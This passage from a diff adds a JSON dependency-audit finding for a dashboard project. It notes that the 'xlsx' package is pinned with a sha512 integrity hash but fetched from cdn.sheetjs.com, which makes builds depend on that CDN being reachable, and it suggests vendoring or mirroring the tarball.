+  "evidence": "$ python3 -c \"import json; d=json.load(open('package-lock.json')); print(json.dumps({k2:v2 for k2,v2 in d['packages']['node_modules/xlsx'].items() if k2 in ('version','resolved','integrity')}, indent=1))\"\n{\n \"version\": \"0.20.3\",\n \"resolved\": \"https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz\",\n \"integrity\": \"sha512-oLDq3jw7AcLqKWH2AhCpVTZl8mf6X2YReP+Neh0SJUzV/BdZYjth94tG5toiMB1PPrYtxOCfaoUCkvtuH+3AJA==\"\n}\n\nThis is the RIGHT call for security \u2014 the npm-registry `xlsx` package is abandoned at 0.18.5 and carries unfixed CVEs \u2014 and the sha512 integrity IS pinned, so tampering fails the install rather than shipping.",
+  "impact": "Availability, not tampering. `npm ci` on Vercel, on Render (render.yaml buildCommand) and in the test.yml CI job all need cdn.sheetjs.com reachable. A CDN outage, or a corporate proxy/registry mirror that only whitelists registry.npmjs.org, breaks every build and deploy with an error that looks nothing like a dependency problem.",
+  "suggested_fix": "Vendor the tarball into the repo and resolve it by relative path, or mirror it to a registry the org controls. If neither is acceptable, document the dependency in the deploy runbook so the failure mode is recognisable when it happens.",
+  "repro": [
+   "cd /Users/shubhang/Desktop/Projects/uganda-dashboard && grep -n 'cdn.sheetjs.com' package.json package-lock.json | head"
+  ],
+  "agent": "A24"
+ }
+]
